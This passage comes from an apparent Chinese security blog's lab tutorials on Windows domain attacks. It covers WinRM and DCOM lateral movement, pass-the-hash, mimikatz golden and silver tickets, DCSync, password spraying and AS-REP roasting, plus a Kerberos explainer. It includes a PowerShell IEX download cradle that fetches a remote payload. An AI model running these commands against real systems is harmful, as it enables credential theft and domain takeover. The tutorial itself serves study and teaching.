,Snull, &quot;/c  hostname &gt; c:\fromdcom.txt &quot;, &quot;7&quot;)</span><br></pre></td></tr></table></figure><p><img src="image-20210204161144789.png" alt="image-20210204161144789"></p><p>执行成功后会在目标生成<code>c:\fromdcom.txt </code></p><h2 id="8-Password-Spray"><a href="#8-Password-Spray" class="headerlink" title="8.Password Spray"></a>8.Password Spray</h2><p>进行密码破解</p><p><img src="image-20210204161455802.png" alt="image-20210204161455802"></p><h2 id="9-winrm远程管理服务"><a href="#9-winrm远程管理服务" class="headerlink" title="9.winrm远程管理服务"></a>9.winrm远程管理服务</h2><p>WinRM是Microsoft对WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的”防火墙友协议,它让来自不同供应商的硬件和操作系统能够互相操作.</p><p>winRM的默认端口为5985 ( http )或5986 ( https )</p><p>第一次使用要设置一个信任</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br><span class="line">Restart-Service winRM</span><br></pre></td></tr></table></figure><p>反弹一个cs会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName target_ip -ScriptBlock &#123; powershell.exe -nop -w hidden -c &quot;IEX((new-object net.webclient).downloadstring(&quot;webshell_addr&quot;)&quot;&#125; -credential administrator</span><br></pre></td></tr></table></figure><p>反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName target_ip -Credential 域名\用户名</span><br></pre></td></tr></table></figure><p><img src="image-20210204161911483.png" alt="image-20210204161911483"></p><p><strong>Winrs</strong></p><p>远程管理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:target_ip -u:DC\username -p:password &quot;command&quot;</span><br></pre></td></tr></table></figure><p>例如得到ip信息</p><p><img src="image-20210204162104661.png" alt="image-20210204162104661"></p><p>将命令替换为cmd即可得到目标cmd环境。</p><p><img src="image-20210204162509481.png" alt="image-20210204162509481"></p><p><strong>cs—winrm</strong></p><p><img src="image-20210204162557379.png" alt="image-20210204162557379"></p><p>再选择用户名密码监听方式。</p><p><img src="image-20210204162735477.png" alt="image-20210204162735477"></p><p>等待即可</p><h2 id="10-Pass-The-Hash-pth"><a href="#10-Pass-The-Hash-pth" class="headerlink" title="10.Pass-The-Hash(pth)"></a>10.Pass-The-Hash(pth)</h2><p>hash传递攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:USER  /ntlm:HASH /run: cmd.exe</span><br></pre></td></tr></table></figure><p><img src="image-20210204163408004.png" alt="image-20210204163408004"></p><p>执行完毕后会弹出cmd框</p><p><img src="image-20210204163549805.png" alt="image-20210204163549805"></p><p>当然也就出现了hash传递防护：</p><p><strong>LocalAccountTokenFilterPolicy</strong></p><p>在windows Vista之后引入了一种默认开启的remote UAC，计算机的任何非SID 500本地管理员帐户，用户在远程计算机上没有特权提升能力，并且用户无法执行管理任务.</p><p>域内一般默认会启用winrm，我们便可以通过pth然后启动进程然后steal_token，使用winrm执行命令。在域管下执行：</p><p><img src="image-20210204164148390.png" alt="image-20210204164148390"></p><p>附上依次此类型的脚本</p><p><a href="https://github.com/FSecureLABS/gists/blob/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1">https://github.com/FSecureLABS/gists/blob/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1</a></p><h2 id="11-Pass-the-Ticket"><a href="#11-Pass-the-Ticket" class="headerlink" title="11.Pass-the-Ticket"></a>11.Pass-the-Ticket</h2><p>票据传递（黄金、白银）</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wmic </tag>
            
            <tag> wmiexec.vbs </tag>
            
            <tag> Invoke-TheHash.ps1 </tag>
            
            <tag> pth工具集 </tag>
            
            <tag> Remote Service Creation </tag>
            
            <tag> Remote Desktop Protocol-RDP hijacking </tag>
            
            <tag> PowerShell Remoting </tag>
            
            <tag> Task Scheduler </tag>
            
            <tag> PsExec </tag>
            
            <tag> DCOM </tag>
            
            <tag> Password Spray </tag>
            
            <tag> winrm远程管理服务 </tag>
            
            <tag> Pass-The-Hash(pth) </tag>
            
            <tag> LocalAccountTokenFilterPolicy </tag>
            
            <tag> Pass-the-Ticket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内攻击</title>
      <link href="/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/"/>
      <url>/2020/10/12/%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>本文介绍一些域内攻击的工具以及方法。</p><span id="more"></span><p>攻击机：kali：192.168.43.30</p><p>客户机DC：win2012：192.168.8.211</p><p>客户机：win7： 182.168.8.57</p><p>以下有关在win7复现没有成功的，在win2008上复现成功，没有放置贴图。</p><h2 id="1-kerberos攻击"><a href="#1-kerberos攻击" class="headerlink" title="1.kerberos攻击"></a>1.kerberos攻击</h2><h3 id="1-使用mimikatz的黄金票据-dcsync获得域密码"><a href="#1-使用mimikatz的黄金票据-dcsync获得域密码" class="headerlink" title="1.使用mimikatz的黄金票据+dcsync获得域密码"></a>1.使用mimikatz的黄金票据+dcsync获得域密码</h3><p>dcsync: mimikatz中的功能，可以有效地“假冒”一个域控制器，并可以向目标域控制器请求帐户密码数据</p><p>首先伪造一个黄金票据</p><p><code>kerberos: :golden /admin:Administrator /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT Hash NTLM&gt;  /ticket: Administrator.kiribi</code></p><p><img src="image-20210202192045542.png" alt="image-20210202192045542"></p><p>在使用ptt进行票据攻击：<code>Kerberos::ptt Administrator.kiribi</code></p><p><img src="image-20210202192205698.png" alt="image-20210202192205698"></p><p>此时已得到域控完整权限，可以使用psexec获得域控cmd权限：<code>psexec [\\域控ip](file://域控ip) cmd</code></p><p><img src="image-20210202192514462.png" alt="image-20210202192514462"></p><p>也可以执行获取指定用户的hash值：<code>lsadump::dcsync /user:用户 /domain:域</code></p><p>记得结束之后完成清楚票据：<code>kerberos::purge</code></p><h3 id="2-域用户、密码枚举"><a href="#2-域用户、密码枚举" class="headerlink" title="2.域用户、密码枚举"></a>2.域用户、密码枚举</h3><p>github项目：<a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p><p>DomainPasswordSpray是用PowerShell编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用LDAP从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒</p><h4 id="1-枚举用户"><a href="#1-枚举用户" class="headerlink" title="1.枚举用户"></a>1.枚举用户</h4><p>在power shell中导入脚本:<code>Import-Module .\DomainPasswordSpray.ps1</code></p><p>再执行以下内容进行用户名枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</span><br><span class="line">参数:Domain指定要测试的域名</span><br><span class="line">参数:RemoveDisabled尝试从用户列表删除禁用的账户</span><br><span class="line">参数:RemovePotentialLockouts删除锁定账户</span><br><span class="line">参数: UserList自定义用户列表(字典)。如果未指定，这将自动从域中获取5参数:Password指定单个密码进行口令测试</span><br><span class="line">参数:PasswordList指定一个密码字典</span><br><span class="line">参数:OutFile将结果保存到某个文件</span><br><span class="line">参数:Force当枚举出第一个后继续枚举，不询问</span><br></pre></td></tr></table></figure><p><img src="image-20210203004732222.png" alt="image-20210203004732222"></p><p><img src="image-20210203004754984.png" alt="image-20210203004754984"></p><h4 id="2-枚举密码"><a href="#2-枚举密码" class="headerlink" title="2.枚举密码"></a>2.枚举密码</h4><p>相当于指定密码进行爆破.</p><p>执行以下命令进行密码枚举：<code> Invoke-DomainPasswordspray -Domain 域名 -Password 密码 ASD -OutFile pass.txt</code></p><p><img src="image-20210203004925060.png" alt="image-20210203004925060"></p><h3 id="3-AS-REP-Roasting"><a href="#3-AS-REP-Roasting" class="headerlink" title="3.AS-REP-Roasting"></a>3.AS-REP-Roasting</h3><p><strong>原理</strong>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</p><p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：<a href="http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&idx=3&mid=2247488900&scene=21&sn=dc2689efec7757f7b432e1fb38b599d4#wechat_redirect">域内认证之Kerberos协议详解。</a></p><p>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p><p><strong>攻击条件</strong></p><ul><li>域用户设置了 “ Do not require Kerberos preauthentication(不需要kerberos预身份验证) ”<ul><li>开启命令<ul><li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li></ul></li><li>关闭命令<ul><li><code>Import-Module  .PowerView.ps1 Set-DomainObject  -Identity  testb  -XOR  @&#123;userAccountControl=4194304&#125;  -Verbose</code></li></ul></li></ul></li><li>需要一台可与KDC进行通信的主机&#x2F;用户</li></ul><p><strong>攻击方式</strong></p><p>1.linux下可以使用GetNPUsers.py这款工具进行破解.</p><p>2.windows下使用Rubeus.exe进行破解(需要.net3.5)</p><p>获得一个hashes.asreproast文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast</span><br></pre></td></tr></table></figure><p>得到hashes.asreproast文件后可以使用hashcat或者john进行破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt</span><br></pre></td></tr></table></figure><p>3.powershell</p><p>工具</p><p>powerview.ps1：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</a></p><p>ASREPRoast.ps1：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p><p>使用powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName 用户名 -Domain 域名 | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p>将hash.txt里面的除Hash字段其他的都删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64<span class="selector-class">.exe</span> -m <span class="number">18200</span> hash<span class="selector-class">.txt</span> pass<span class="selector-class">.txt</span> <span class="attr">--force</span></span><br></pre></td></tr></table></figure><h2 id="2-域内提权"><a href="#2-域内提权" class="headerlink" title="2.域内提权"></a>2.域内提权</h2><p>Ms14-086（支持到win2012,但是2012不稳定）</p><p>通过是否打补丁(kb3011780)来判断是否存在漏洞</p><p>生成一个文件ccache文件：<code>MS14-068.exe -u 用户名@域名 -p 明文密码 -s &lt;userSid&gt; -d 域控ip</code></p><p>但是在win7上使用时会报错，可能是我域内环境配置有问题，在win2008时没有问题。</p><p><img src="image-20210203151836389.png" alt="image-20210203151836389"></p><p><img src="image-20210203151950021.png" alt="image-20210203151950021"></p><p>用mimikatz进行攻击：kerberos::ptc ccache文件</p><p><img src="image-20210203152009209.png" alt="image-20210203152009209"></p><p>此时当前用户就是域管理员用户</p><h2 id="3-域hash"><a href="#3-域hash" class="headerlink" title="3.域hash"></a>3.域hash</h2><p>需要域控权限</p><p>1.mimikatz抓取</p><p>可以使用mimikatz生成一个日志记录信息（会在当前目录下生成一个mimikatz.txt,之后操作以及结果都会被记录在日志中）:<code>log</code></p><p><img src="image-20210203154454934.png" alt="image-20210203154454934"></p><p>抓取域内用户的名称和hash：<code>lsadump::dcsync /domain:域控名 /all /csv</code></p><p><img src="image-20210203154445293.png" alt="image-20210203154445293"></p><p>或者使用：<code>lsadump::lsa /inject</code></p><p><img src="image-20210203154531731.png" alt="image-20210203154531731"></p><p>2.msf抓取</p><p>先反弹一个会话</p><p><img src="image-20210203152945003.png" alt="image-20210203152945003"></p><p>利用domain_hashdump模块进行抓取</p><p><img src="image-20210203153012768.png" alt="image-20210203153012768"></p><p><img src="image-20210203153023396.png" alt="image-20210203153023396"></p><p>由于当前是32bits的载荷运行在一个64bits的系统上，所以需要进行进程迁移</p><p><img src="image-20210203153047077.png" alt="image-20210203153047077"></p><p><img src="image-20210203153100040.png" alt="image-20210203153100040"></p><p>之后再次运行hashdump，会得到一个数据库存储域内所有用户的信息</p><p><img src="image-20210203153119397.png" alt="image-20210203153119397"></p><p>进行破解即可</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mimikatz的黄金票据+dcsync </tag>
            
            <tag> 域用户、密码枚举 </tag>
            
            <tag> AS-REP-Roasting </tag>
            
            <tag> 抓取域hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白银票据和黄金票据</title>
      <link href="/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"/>
      <url>/2020/10/11/%E7%A5%A8%E6%8D%AE%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="1-白银票据"><a href="#1-白银票据" class="headerlink" title="1.白银票据"></a>1.白银票据</h2><p><strong>原理</strong>：在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。<br> 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p><p><strong>特点</strong>：1.不需要与KDC进行交互、2.需要目标服务的NTLM Hash</p><p>在第三步认证中Ticket的组成：Ticket&#x3D;Server Hash(Server Session Key+client info+End Time)</p><p>当拥有server hash时，就可以伪造一个不经过KDC认证的ticket（当server session key在未发送ticket之前，服务器是不知道server session key是什么的，所以，一切来源于server hash）</p><p><strong>攻击</strong>：使用mimikat进行kerberos进行攻击</p><p>首先用mimikatz在客户机上抓取信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="image-20210202142456321.png" alt="image-20210202142456321"></p><p>先清空之前存在的票据：<code>kerberos : : purge</code></p><p><img src="image-20210202175713372.png" alt="image-20210202175713372"></p><p>然后进行伪造票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt;/sid:&lt;域SID&gt;/target&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt;/rc4:&lt;NTLMHash&gt; /user:&lt;用户名&gt; /ptt</span><br><span class="line"># /domain:域名</span><br><span class="line"># /sid: 域控SID值</span><br><span class="line"># /target:域控机器全称</span><br><span class="line"># /service:需要指定相关的服务名</span><br><span class="line"># /rc4:域控的计算机账户ntlm hash</span><br><span class="line"># /user:要伪造的用户名，任意填写，可写可不写</span><br></pre></td></tr></table></figure><p>​服务类型有</p><p><img src="image-20210202175302660.png" alt="image-20210202175302660"></p><p><img src="image-20210202182414994.png" alt="image-20210202182414994"></p><p>查看当前拥有的票据：<code>kerberos::list</code></p><p><img src="image-20210202182511993.png" alt="image-20210202182511993"></p><p>查看是否可以访问域控的资源：<code>net use \\域控ip\磁盘符$</code>，但是会要求认证</p><p><img src="image-20210202212307313.png" alt="image-20210202212307313"></p><p>在使用win2008进行票据伪造的时候并没有认证。</p><p><img src="image-20210202190127055.png" alt="image-20210202190127055"></p><p>查看访问的资源：<code>dir \\域控ip\磁盘符$</code></p><p><img src="image-20210202190222105.png" alt="image-20210202190222105"></p><p>后续要访问其他文件资源，直接在<code>dir \\域控ip\磁盘符$</code>跟文件夹，例如：<code>dir \\域控ip\磁盘符$\test</code></p><p>另外也可以使用pth进行连接：<code>sekurlsa::pth /user:administrator /domain:域控名 /ntlm:域控hsah值 </code>，执行后会弹出一个cmd框。之后再<code>net use \\域控ip\磁盘符$</code>连接即可。</p><p>注：另外，在win2003上操作时，票据无法成功创建，会报以下错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : c000000d</span><br></pre></td></tr></table></figure><h2 id="2-黄金票据"><a href="#2-黄金票据" class="headerlink" title="2.黄金票据"></a>2.黄金票据</h2><p><strong>原理</strong>通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的KRB_AS_REQ时，Client拥有两份加密的session Key,K( c,tgs )分别是:</p><p>1.用自己NTLM Hash加密的session Key. </p><p>2.用krbtgt用户的NTLM Hash加密的TGT。</p><p>前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用krbtgt用户的NTLM Hash进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有krbtgt用户的Hash，那么意味着我们可以解密以及伪造TGT</p><p>使用mimikatz进行攻击</p><p><strong>攻击</strong>：使用mimikatz</p><p>首先在域控上将krbtgt的用户hash使用mimikatz给dump下来：<code>lsadump::dcsync /domain:域控名 /user:krbtgt</code></p><p><img src="image-20210202191139393.png" alt="image-20210202191139393"></p><p>然后在客户机上执行</p><p><code>kerberos:.golden /domain:&lt;域名&gt;/sid:&lt;域SID&gt; /aes256:&lt;aes256_hmac&gt; /user:&lt;任意用户名&gt;/ptt</code></p><p>或者</p><p><code>kerberos:golden /domain:&lt;域名&gt;/sid:&lt;域SID&gt;/rC4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt;/ptt</code></p><p>或者</p><p><code>kerberos: :golden /admin:Administrator /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;KRBTGT Hash NTLM&gt;  /ticket: Administrator.kiribi</code></p><p>生成一个票据文件</p><p><img src="image-20210202192045542.png" alt="image-20210202192045542"></p><p>在使用ptt进行票据攻击：<code>Kerberos::ptt Administrator.kiribi</code></p><p><img src="image-20210202192205698.png" alt="image-20210202192205698"></p><p>此时已得到域控完整权限，可以使用psexec获得域控cmd权限：<code>psexec [\\域控ip](file://域控ip) cmd</code></p><p><img src="image-20210202192514462.png" alt="image-20210202192514462"></p><h2 id="3-黄金票据和白银票据区别"><a href="#3-黄金票据和白银票据区别" class="headerlink" title="3.黄金票据和白银票据区别"></a>3.黄金票据和白银票据区别</h2><h3 id="1-获取权限不同"><a href="#1-获取权限不同" class="headerlink" title="1.获取权限不同"></a>1.获取权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p><h3 id="2-认证流程不同"><a href="#2-认证流程不同" class="headerlink" title="2.认证流程不同"></a>2.认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p><h3 id="3-加密方式不同"><a href="#3-加密方式不同" class="headerlink" title="3.加密方式不同"></a>3.加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p><h2 id="4-两者结果"><a href="#4-两者结果" class="headerlink" title="4.两者结果"></a>4.两者结果</h2><p>金票：能够在域里边所有机器上都以administrator登录</p><p>银票：实用白银票据添加cifs后，dir由无权查看变为有权查看</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黄金票据 </tag>
            
            <tag> 白银票据 </tag>
            
            <tag> 黄金票据和白银票据区别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kerberos</title>
      <link href="/2020/10/10/kerberos/"/>
      <url>/2020/10/10/kerberos/</url>
      
        <content type="html"><![CDATA[<p>本文介绍kerberos的相关知识以及利用攻击方法</p><span id="more"></span><p>攻击机：kali：192.168.43.30</p><p>客户机DC：win2012：192.168.8.211</p><p>客户机：win7： 182.168.8.57</p><h2 id="1-kerberos介绍"><a href="#1-kerberos介绍" class="headerlink" title="1.kerberos介绍"></a>1.kerberos介绍</h2><p>在古希腊神话中Kerberos指的是：有着一只三头犬守护在地狱之门外,禁止任何人类闯入地狱之中。而现实中的Kerberos是一种网络身份验证协议,旨在通过密钥加密技术为客户端&#x2F;服务器应用程序提供身份验证,主要用在域环境下的身份验证。</p><p>Kerberos是一种由MIT （麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证。</p><p>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为 客户机&#x2F;服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</p><p><img src="image-20210202131840081.png" alt="image-20210202131840081"></p><h3 id="1-域认证所参与的角色"><a href="#1-域认证所参与的角色" class="headerlink" title="1.域认证所参与的角色:"></a>1.域认证所参与的角色:</h3><ul><li>访问服务的client</li><li>提供服务的server</li><li>KDC(Key Distribution Center) &#x3D; DC(Domain Controller)密钥分发中心，一般为域控制器</li></ul><p>票据(Ticket ):是网络对象互相访问的凭证。TGT ( Ticket Granting Ticket ):入场券，通过入场券能够获得票据，是一种临时凭证的存在。<br>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成:</p><ul><li>Authentication Service:为client生成TGT的服务，简称AS</li><li>Ticket Granting Service: 为client生成某个服务的ticket，简称TGS。</li></ul><p>另外还需要介绍一个类似于本机SAM的一个数据库:AD，全称叫account database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p><img src="image-20210202014237001.png" alt="image-20210202014237001"></p><p>KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。在整个kerberos认证中会多次用到它的Hash值去做验证。</p><p><img src="image-20210202014455121.png" alt="image-20210202014455121"></p><h3 id="2-域认证粗略流程"><a href="#2-域认证粗略流程" class="headerlink" title="2.域认证粗略流程"></a>2.域认证粗略流程</h3><p>1.client向kerberos服务请求，希望获取访问server的权限。kerberos得到了这个消息，首先得判断client是否是可信赖的，也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client.</p><p>2.client得到了TGT后，继续向kerberos请求，希望获取访问server的权限。kerberos又得到了这个消息，这时候通过client消息中的TGT，判断出了client拥有了这个权限，给了client访问server的权限ticket。</p><p>3.client得到ticket后，终于可以成功访问server。这个ticket只是针对这个server,其他server需要向TGS申请。</p><p>The Authentication Service Exchange: Client与 AS 的交互;(请求TGT)</p><p>The Ticket-Granting Service (TGS)Exchange: Client 与 TGS的交互;(请求ServerTicket)</p><p>The ClientlServer Authentication Exchange: Client 与 Server的交互。(访问)</p><p><img src="image-20210202015026043.png" alt="image-20210202015026043"></p><h3 id="3-域认证"><a href="#3-域认证" class="headerlink" title="3.域认证:"></a>3.域认证:</h3><ul><li><p><strong>第一步:Client 与 AS 的交互</strong><br>首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash.<br>KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT. </p><ul><li><p>Session Key用于客户端向TGS服务通信。</p></li><li><p>域内所有网络对象的凭证都在AD中保存.。</p></li><li><p>KDC中某个用户指的是krbtgt</p><p><strong>具体流程:</strong></p><p>KRB_AS_REQ<br>client-&gt;AS:发送Authenticator1(Client密码加密TimeStamp)<br>第一步client 先向KDC的AS 发送Authenticator1，内容为通过client密码 Hash加密的时间戳、ClientID、网络地址、加密类型等内容。</p></li></ul></li></ul><p><img src="image-20210202015819837.png" alt="image-20210202015819837"></p><p>​KRB_AS_REP<br>​AS-&gt; Client:发送 client密码加密的sessionkey-as和票据TGT(KRBTGT HASH加密的sessionkey-as和TimeStamp)<br>​在KDC中存储了域中所有用户的密码HASH，当AS接收到Client的请求之后会根据KDC中存储的密码来解密，解密成功并且验证信息。验证成功后返回给client 由 client密码HASH加密的sessionkey-as 和TGT (由KRBTGT HASH加密的sessionkey-as和Timestamp等信息)。<br>​其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket. </p><ul><li><strong>第二步:Client 与 TGS 的交互,Client使用TGT从KDC获得基于某个Server的Ticket</strong><br>客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。<br>KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。<br>验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了<br>Server Hash:这个Hash是在AD中服务器计算机的NTLM Hash。</li></ul><p>​<strong>具体流程:</strong><br>  Client -&gt;TGS 发送 Authenticator2(sessionkey-as加密Timestamp)和票据TGT(KRBTGTHASH加密的sessionkey-as和Timestamp)<br>  Client接收到了加密后的Sessionkey-as 和TGT之后，用自身密码解密得到sSessionkey-as,TGT是由KDC 密码加密，Client 无法解密。这时Client再用Sessionkey-as加密 TimeStamp和TGT一起发送给KDC 中的TGS ( TicketGranting Server )票据授权服务器换取能够访问Server的票据。</p><p><img src="image-20210202021236912.png" alt="image-20210202021236912"></p><p>​TGS-&gt; Client 发送密文1(sessionkey-as 加密sessionkey-tgs)和票据ST(Server密码 HASH加密sessionkey-tgs)</p><p>​TGS 收到Client 发送过来的TGT和Sessionkey-as 加密的Timestamp 之后，首先会检查自身是否存在Client所请求的服务。如果服务存在，则用KRBTGT密码解密TGT。一般情况下TGS 会检查TGT中的时间戳查看TGT是否过期，且原始地址是否和TGT中保存的地址相同。验证成功之后将用sessionkey-as加密的sessionkey-tgs 和Server密码 HASH加密的Sessionkey-tgs 发送给client。</p><ul><li><p><strong>第三步:Client 与 Server 的交互–双向验证</strong><br>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。 </p><ul><li><p>Ticket客户端无法解密</p></li><li><p>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)。</p></li><li><p>比较时间长度</p><p><strong>具体流程:</strong></p><p>client -&gt;Server 发送Authenticator3(sessionkey-tgs 加密TimeStamp)和票据ST(Server密码HASH加密sessionkey-tgs)<br>client 收到sessionkey-as 加密的sessionkey-tgs 和Server密码 HAsA加密的sessionkey-tgs 之后用sessionkey-as解密得到sessionkey-tgs，然后把sessionkey-tgs 加密的<br>Timestamp和 ST一起发送给Server.</p><p><img src="image-20210202021708277.png" alt="image-20210202021708277"></p><p>Server-&gt; Client<br>server通过自己的密码解密ST，得到 sessionkey-tgs,再用sessionkey-tgs解密Authenticator3得到Timestamp，验证正确返回验证成功。<br>校验通过后，认证成功，该票据会一直存在客户端内存中。</p></li></ul></li></ul><h3 id="4-PAC"><a href="#4-PAC" class="headerlink" 